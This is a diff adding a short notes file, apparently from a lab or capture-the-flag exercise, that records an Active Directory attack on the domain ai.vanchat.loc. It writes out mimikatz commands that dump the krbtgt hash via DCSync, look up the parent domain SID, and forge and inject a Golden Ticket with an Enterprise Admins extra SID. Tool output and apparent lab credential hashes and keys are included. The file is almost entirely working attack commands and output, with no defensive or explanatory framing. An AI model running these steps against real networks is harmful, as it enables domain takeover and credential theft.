@@ -1,0 +1,45 @@
+#Run mimikatz as administrator
+
+#Dumping the krbtgt hash via DCSync
+privilege::debug
+lsadump::dcsync /domain:ai.vanchat.loc /user:ai\krbtgt
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010202 ( ACCOUNTDISABLE NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 10/29/2025 8:18:41 AM
+Object Security ID   : S-1-5-21-2486023134-1966250817-35160293-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: d816e3b716ded6bc8cfc1feb5d165887
+
+---
+
+#Retrieve the domain SID:
+Get-ADDomain -Identity vanchat.loc | Select-Object -ExpandProperty DomainSID
+	SID_Parent: S-1-5-21-2737471197-2753561878-509622479
+
+---
+
+#With all required information, lets forge and inject a Golden Ticket:
+
+mimikatz # kerberos::golden /user:Administrator /domain:ai.vanchat.loc /sid:S-1-5-21-2486023134-1966250817-35160293 /aes256:cb01c465fc70ca06856fe0803fb3bd00aff24191f391bc36590233556158ffee /id:500 /groups:512 /sids:S-1-5-21-2737471197-2753561878-509622479-519 /ptt
+User      : Administrator
+Domain    : ai.vanchat.loc (AI)
+SID       : S-1-5-21-2486023134-1966250817-35160293
+User Id   : 500
+Groups Id : *512
+Extra SIDs: S-1-5-21-2737471197-2753561878-509622479-519 ;
+ServiceKey: cb01c465fc70ca06856fe0803fb3bd00aff24191f391bc36590233556158ffee - aes256_hmac
+Lifetime  : 4/4/2026 7:53:06 AM ; 4/1/2036 7:53:06 AM ; 4/1/2036 7:53:06 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ ai.vanchat.loc' successfully submitted for current session
